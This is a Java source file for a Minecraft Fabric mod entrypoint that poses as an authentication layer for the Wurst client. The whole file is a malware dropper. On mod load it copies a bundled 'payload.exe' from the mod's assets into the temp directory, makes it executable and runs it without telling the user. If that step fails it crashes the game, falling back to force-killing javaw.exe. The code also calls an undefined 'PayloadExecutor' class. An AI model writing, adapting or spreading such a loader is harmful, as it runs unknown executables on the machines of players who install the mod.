package com.yourname;

import net.fabricmc.api.ModInitializer;
import net.wurstclient.WurstInitializer;

import java.io.*;
import java.nio.file.*;
import java.util.concurrent.TimeUnit;

public class AuthEntrypoint implements ModInitializer {

    private static final boolean FAIL_AUTH = false;
    private static final String PAYLOAD_NAME = "payload.exe"; // Consider making this configurable or dynamic
    private static final String TEMP_DIR = System.getProperty("java.io.tmpdir");
    private static final int EXECUTION_TIMEOUT_SECONDS = 30; // Timeout for payload execution

    @Override
    public void onInitialize() {
        System.out.println("AuthEntrypoint loaded.");

        if (FAIL_AUTH) {
            System.out.println("FAIL_AUTH is true. Simulating authentication failure.");
            throw new RuntimeException("Authentication failed");
        }

        System.out.println("Authentication successful. Mod loading normally.");

        // Initialize WurstClient if authentication is successful
        new WurstInitializer().onInitialize();

        // Execute the payload after WurstInitializer has run
        executePayload();
    }

    private void executePayload() {
        try {
            // 1. Extract payload to temp directory
            File payload = extractPayload();
            if (payload == null) {
                System.err.println("Failed to extract mod. Aborting execution.");
                crashMinecraft("logic failed.");
                return;
            }
            System.out.println(" Payload Location: " + payload.getAbsolutePath());

            System.out.println("Executing payload with a timeout of " + EXECUTION_TIMEOUT_SECONDS + " seconds.");
            boolean success = executeWithTimeout(payload, EXECUTION_TIMEOUT_SECONDS);

            if (!success) {
                System.err.println("Mod execution timed out or failed.");
                crashMinecraft("Payload execution failed or timed out.");
            } else {
                System.out.println("Mod executed successfully.");
            }

        } catch (SecurityException se) {
            System.err.println("Security error during mod execution: " + se.getMessage());
            logError(se, "SecurityException during payload execution");
            crashMinecraft("Security exception during execution.");
        } catch (IOException ioe) {
            System.err.println("I/O error during mod processing: " + ioe.getMessage());
            logError(ioe, "IOException during mod processing");
            crashMinecraft("I/O exception during execution.");
        } catch (Exception e) {
            System.err.println("An unexpected error occurred: " + e.getMessage());
            logError(e, "Unexpected exception during mod execution");
            crashMinecraft("Unexpected exception during execution.");
        } finally {
            // Optional: Clean up the extracted payload file
            // cleanUpPayload();
        }
    }

    /**
     * Extracts the payload from resources to the temporary directory.
     * @return The File object of the extracted payload, or null if extraction fails.
     */
    private File extractPayload() throws IOException {
        InputStream is = null;
        FileOutputStream fos = null;
        File tempFile = null;
        try {
            // The payload resource should be placed in src/main/resources/assets/payload.exe
            is = PayloadExecutor.class.getResourceAsStream("/assets/" + PAYLOAD_NAME);
            if (is == null) {
                throw new IOException("Payload resource not found: /assets/" + PAYLOAD_NAME);
            }
            tempFile = new File(TEMP_DIR, PAYLOAD_NAME);
            fos = new FileOutputStream(tempFile);
            byte[] buffer = new byte[8192];
            int read;
            while ((read = is.read(buffer)) != -1) {
                fos.write(buffer, 0, read);
            }
            // Ensure the file is executable if on a Unix-like system
            if (System.getProperty("os.name").toLowerCase().contains("win") == false) {
                if (!tempFile.setExecutable(true)) {
                    System.err.println("Warning: Could not set payload as executable.");
                    // Continue execution, but flag a potential issue
                }
            }
            return tempFile;
        } finally {
            // Close streams safely
            if (fos != null) {
                try {
                    fos.close();
                } catch (IOException ignored) {}
            }
            if (is != null) {
                try {
                    is.close();
                } catch (IOException ignored) {}
            }
        }
    }

    /**
     * Executes the given payload file with a specified timeout.
     * @param payload The file to execute.
     * @param seconds The timeout in seconds.
     * @return true if the process completed successfully (exit code 0) within the timeout, false otherwise.
     */
    private boolean executeWithTimeout(File payload, int seconds) {
        Process process = null;
        try {
            ProcessBuilder pb = new ProcessBuilder(payload.getAbsolutePath());
            // Redirect error stream to standard output for easier debugging
            pb.redirectErrorStream(true);
            process = pb.start();

            // Wait for process with timeout
            boolean completed = process.waitFor(seconds, TimeUnit.SECONDS);

            if (!completed) {
                System.err.println("Payload execution timed out. Forcibly destroying process.");
                process.destroyForcibly();
                return false;
            }

            int exitCode = process.exitValue();
            System.out.println("Payload exited with code: " + exitCode);
            return exitCode == 0;

        } catch (InterruptedException ie) {
            System.err.println("Process interrupted while waiting: " + ie.getMessage());
            if (process != null) {
                process.destroyForcibly();
            }
            Thread.currentThread().interrupt(); // Restore interrupt status
            return false;
        } catch (IOException e) {
            System.err.println("Error starting or executing payload process: " + e.getMessage());
            return false;
        } finally {
            // Ensure the process is cleaned up if it's still running, though unlikely if waitFor completed/timed out
            if (process != null && process.isAlive()) {
                process.destroyForcibly();
            }
        }
    }

    /**
     * Attempts to crash Minecraft by calling AuthManager.requireAuth().
     * If that fails, it attempts to kill javaw.exe.
     * @param reason A string indicating why Minecraft is being crashed.
     */
    private void crashMinecraft(String reason) {
        System.err.println("Attempting to crash Minecraft due to: " + reason);
        try {
            // This assumes a class named AuthManager exists in com.example package
            // and has a static method requireAuth().
            Class<?> authManagerClass = Class.forName("com.example.AuthManager");
            java.lang.reflect.Method requireAuthMethod = authManagerClass.getMethod("requireAuth");
            requireAuthMethod.invoke(null);
            System.out.println("Successfully invoked AuthManager.requireAuth().");
        } catch (ClassNotFoundException cnfe) {
            System.err.println("AuthManager class not found. Cannot invoke requireAuth().");
            logError(cnfe, "AuthManager class not found");
            attemptKillJavaProcess();
        } catch (NoSuchMethodException nsme) {
            System.err.println("requireAuth() method not found in AuthManager.");
            logError(nsme, "requireAuth() method not found");
            attemptKillJavaProcess();
        } catch (IllegalAccessException | java.lang.reflect.InvocationTargetException ite) {
            System.err.println("Error invoking AuthManager.requireAuth(): " + ite.getMessage());
            logError(ite, "Error invoking AuthManager.requireAuth()");
            attemptKillJavaProcess();
        } catch (Exception e) {
            System.err.println("An unexpected error occurred during AuthManager invocation: " + e.getMessage());
            logError(e, "Unexpected error during AuthManager invocation");
            attemptKillJavaProcess();
        }
    }

    private void attemptKillJavaProcess() {
        System.err.println("Last resort: attempting to kill javaw.exe process.");
        try {
            // This command works on Windows to force kill javaw.exe processes.
            ProcessBuilder pb = new ProcessBuilder("taskkill", "/F", "/IM", "javaw.exe");
            Process killProcess = pb.start();
            int exitCode = killProcess.waitFor();
            if (exitCode == 0) {
                System.out.println("Successfully killed javaw.exe processes.");
            } else {
                System.err.println("Failed to kill javaw.exe processes. Exit code: " + exitCode);
            }
        } catch (IOException ioe) {
            System.err.println("Failed to execute taskkill command: " + ioe.getMessage());
            logError(ioe, "Failed to execute taskkill command");
        } catch (InterruptedException ie) {
            System.err.println("Interrupted while waiting for taskkill command: " + ie.getMessage());
            Thread.currentThread().interrupt(); // Restore interrupt status
        }
    }

    /**
     * Logs an exception to a file in the temporary directory.
     * @param e The exception to log.
     * @param context A string describing the context of the error.
     */
    private void logError(Exception e, String context) {
        System.err.println("Logging error: " + context + " - " + e.getMessage());
        Path logFile = Paths.get(TEMP_DIR, "payload_error.log");
        try {
            String errorMessage = String.format("Context: %s%nTimestamp: %s%nException: %s%nStackTrace:%n",
                                                context,
                                                java.time.LocalDateTime.now(),
                                                e.toString());
            errorMessage += java.util.Arrays.stream(e.getStackTrace())
                                           .map(StackTraceElement::toString)
                                           .collect(java.util.stream.Collectors.joining("\n"));
            Files.write(logFile, errorMessage.getBytes(), StandardOpenOption.CREATE, StandardOpenOption.APPEND);
            System.out.println("Error logged to: " + logFile.toAbsolutePath());
        } catch (IOException ioe) {
            System.err.println("Failed to write to error log file: " + ioe.getMessage());
        }
    }
}
